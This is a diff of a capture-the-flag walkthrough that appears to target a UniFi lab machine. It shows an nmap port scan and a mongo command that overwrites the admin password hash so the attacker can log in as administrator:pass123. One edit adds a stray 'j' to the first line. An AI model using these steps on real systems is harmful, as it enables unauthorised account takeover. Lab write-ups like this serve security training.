@@ -1,4 +1,4 @@
-We start with Nmap scan:sudo nmap -sC -sV -p- --min-rate 5000 (target ip).
+jWe start with Nmap scan:sudo nmap -sC -sV -p- --min-rate 5000 (target ip).
 
 We get four tcp ports open: 22 which is ssh, 6789, 8080 which is http, and 8443.
 
@@ -105,8 +105,7 @@ Now, we can change the password in the mongo database by: mongo --port 27117 ace
 ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
 
 
-mongo --port 27117 ace --eval 'db.admin.update({"_id":
-ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$1hns8p8iYj0xsKnZ$HPMP.mZjPHkRqlrelJW4JDTbEogfH085nYLv1Ptafyar0E9PqoL/kSuMnB4vFJFlE4ixst4lGUhG4Ukty3w0U1"}})'
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$1hns8p8iYj0xsKnZ$HPMP.mZjPHkRqlrelJW4JDTbEogfH085nYLv1Ptafyar0E9PqoL/kSuMnB4vFJFlE4ixst4lGUhG4Ukty3w0U1"}})'
 
 Now, if we go to the website and we used these credentials: administrator:pass123, we will log in as admin.
 
